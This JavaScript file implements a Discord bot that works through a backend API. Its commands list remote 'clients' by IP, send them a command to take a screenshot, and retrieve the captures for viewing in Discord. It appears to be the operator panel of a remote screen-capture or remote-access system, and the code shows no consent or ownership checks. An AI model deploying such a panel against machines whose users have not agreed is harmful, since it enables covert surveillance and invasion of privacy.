import { Client, GatewayIntentBits, EmbedBuilder, ButtonBuilder, ActionRowBuilder, StringSelectMenuBuilder,
    AttachmentBuilder} from 'discord.js';
import config from './config.json' assert {type: 'json'};
import axios from "axios";
import {commands} from './commands.js';

const { TOKEN, API_BASE_URL } = config;
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setActivity('/help');
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    switch (interaction.commandName) {
        case 'help':
            await interaction.deferReply({ ephemeral: true });
            const embed = new EmbedBuilder()
                .setTitle('Help')
                .setDescription('Here are the available commands:')
                .addFields(
                    commands.map(command => ({
                        name: `/${command.name}`,
                        value: command.description,
                    }))
                )
                .setTimestamp()
            await interaction.editReply({ embeds: [embed] });
            break;

        case 'screenshot':
            const ip = interaction.options.getString('ip');
            await interaction.deferReply({ ephemeral: true });
            axios.post(`${API_BASE_URL}/command`, {
                command: 'screenshot',
                ip: ip
            })
                .then(response => {
                    interaction.editReply(`Command sent to take a screenshot on ${ip}.`);
                })
                .catch(error => {
                    console.error("Erreur lors de l'envoi de la commande", error);
                    interaction.editReply("Erreur lors de l'envoi de la commande.");
                });
            break;

        case 'clients':
            await interaction.deferReply({ ephemeral: true });
            axios.get(`${API_BASE_URL}/clients`)
                .then(response => {
                    const clients = response.data.clients;
                    const embed = new EmbedBuilder()
                        .setTitle('Clients')
                        .setDescription('Here are the available clients:')
                        .addFields(
                            clients.map(client => ({
                                name: client.name || 'Unnamed client', // Utilisez une valeur par défaut si 'name' est undefined
                                value: client.ip,
                            }))
                        )
                        .setTimestamp()
                    interaction.editReply({embeds: [embed]});
                })
                .catch(error => {
                    console.error("Erreur lors de la récupération des clients", error);
                    interaction.editReply("Erreur lors de la récupération des clients.");
                });
            break;

        case 'stop':
            await interaction.deferReply({ ephemeral: true });
            await interaction.editReply('Stopping the bot...');
            process.exit(0);
            break;

        case 'listallscreenshots':
            await interaction.deferReply({ ephemeral: true });
            axios.get(`${API_BASE_URL}/screenshot`)
                .then(response => {
                    const screenshots = response.data.screenshots;
                    if (!screenshots || screenshots.length === 0) {
                        interaction.editReply("No screenshots available.");
                        return;
                    }
                    const uniqueIps = [...new Set(screenshots.map(s => s.split('/')[1]))]; // Supposons que chaque screenshot a une structure 'screenshots/IP/date_time.png'
                    if (uniqueIps.length === 0) {
                        interaction.editReply("No IPs available for screenshots.");
                        return;
                    }
                    const buttons = uniqueIps.slice(0, 5).map(ip => // Assurez-vous de ne pas dépasser 5 boutons
                        new ButtonBuilder()
                            .setCustomId(`ip_${ip}`)
                            .setLabel(ip)
                            .setStyle(1)
                    );

                    if (buttons.length > 0) {
                        const row = new ActionRowBuilder().addComponents(...buttons);
                        interaction.editReply({ content: "Select an IP to view screenshots:", components: [row] });
                    } else {
                        interaction.editReply("Error: No valid IPs found.");
                    }
                })
                .catch(error => {
                    console.error("Error retrieving screenshots", error);
                    interaction.editReply("Error retrieving screenshots.");
                });
            break;

        default:
            break;
    }
});


client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const ip = interaction.customId.split('_')[1];
    axios.get(`${API_BASE_URL}/screenshot`, { params: { ip: ip } }) // Votre API doit gérer cet endpoint
        .then(response => {
            const screenshots = response.data.screenshots;
            if (screenshots.length === 0) {
                interaction.update({ content: "No screenshots available for this IP.", components: [] });
                return;
            }

            const options = screenshots.map((s, index) => ({
                label: `Screenshot ${index + 1}`,
                description: s.substring(0, 100), // Description pour aider à identifier la capture d'écran
                value: s, // Peut-être un identifiant unique pour la capture d'écran
            }));

            const selectMenu = new StringSelectMenuBuilder()
                .setCustomId('select_screenshot')
                .setPlaceholder('Select a screenshot')
                .addOptions(options);

            const row = new ActionRowBuilder().addComponents(selectMenu);

            interaction.update({ content: `Select a screenshot for IP: ${ip}`, components: [row] });
        })
        .catch(error => {
            console.error("Error retrieving screenshots for IP", error);
            interaction.update({ content: "Error retrieving screenshots for this IP.", components: [] });
        });
});


client.on('interactionCreate', async interaction => {
    if (!interaction.isSelectMenu()) return;

    if (interaction.customId === 'select_screenshot') {
        // Retirer screenshots/ de l'URL pour obtenir l'identifiant unique
        const screenshotIdentifier = interaction.values[0].substring(11);
        const imageUrl = `${API_BASE_URL}/screenshot/${screenshotIdentifier}`;
        axios.get(imageUrl, { responseType: 'arraybuffer' })
            .then(response => {
                const imageBuffer = response.data;
                const attachment = new AttachmentBuilder(imageBuffer, { name: 'screenshot.png' });

                const embed = new EmbedBuilder()
                    .setTitle('Screenshot')
                    .setDescription('Here is the requested screenshot:')
                    .setImage('attachment://screenshot.png');

                interaction.update({
                    content: 'Here is the screenshot:',
                    files: [attachment],
                    embeds: [embed],
                    components: [],
                });
            })
            .catch(error => {
                console.error("Error retrieving screenshot from API", error);
                interaction.update({ content: "Error retrieving screenshot.", components: [] });
            });
    }
});

client.login(TOKEN);